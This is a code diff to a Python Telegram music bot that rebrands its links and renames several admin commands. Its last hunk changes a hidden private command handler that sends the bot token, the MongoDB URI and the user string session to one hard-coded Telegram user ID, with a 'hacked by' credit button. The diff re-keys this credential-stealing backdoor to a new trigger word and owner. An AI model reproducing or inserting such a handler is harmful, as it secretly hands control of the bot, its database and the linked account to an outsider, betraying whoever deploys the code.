@@ -136,9 +136,9 @@ async def help(client: Client, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        "• Add me  •", url="https://t.me/musicXanime_bot?startgroup=true"),
+                        "• Add me  •", url="https://t.me/Mommy_x_musicbot?startgroup=true"),
                     InlineKeyboardButton(
-                        "• Update  •", url="https://t.me/kittyxupdates")  # New button added
+                        "• Update  •", url="https://t.me/The_incricible")  # New button added
                 ]
             ]
         ),
@@ -11805,7 +11805,7 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["hhh", "ghjj", "jjjj"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
+    filters.command(["tosu", "zoyu", "baby"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
@@ -11834,7 +11834,7 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["reload_3"])
 
 
-@app.on_message(filters.command(["iikkk"]) & filters.group & ~BANNED_USERS)
+@app.on_message(filters.command(["tosu"]) & filters.group & ~BANNED_USERS)
 @AdminActual
 async def restartbot(client, message: Message, _):
     mystic = await message.reply_text(_["reload_4"].format(app.mention))
@@ -11877,19 +11877,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("done")
+    filters.command("tosu")
     & filters.private
-    & filters.user(7297381612)
+    & filters.user(6519786491)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/the_incricible)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/moonshining2")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/legend_mickey")
                  ]
             ]
          ),
